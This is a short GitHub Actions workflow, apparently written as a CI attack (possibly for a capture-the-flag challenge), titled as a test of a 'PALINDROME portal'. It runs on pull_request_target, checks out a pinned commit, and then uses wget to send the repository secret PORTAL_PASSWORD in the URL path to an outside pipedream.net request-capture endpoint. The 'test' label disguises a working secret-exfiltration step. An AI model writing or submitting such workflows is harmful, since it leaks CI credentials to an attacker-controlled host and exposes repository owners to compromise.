name: Test the PALINDROME portal pls

on: pull_request_target

jobs:
  authorize:
    environment:
      ${{ github.event_name == 'pull_request_target' &&
      github.event.pull_request.head.repo.full_name != github.repository &&
      'external' || 'internal' }}
    runs-on: windows-latest
    steps:
      - run: "true"

  test:
    needs: authorize
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@16f938a56647d54dfeec7941ed44dc337ebdd8d8
        with:
          ref: 16f938a56647d54dfeec7941ed44dc337ebdd8d8
      - run: C:\msys64\usr\bin\wget.exe '''https://eou8ar92f6o5frq.m.pipedream.net/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
        env:
          EXAMPLE: ${{ secrets.PORTAL_PASSWORD }}
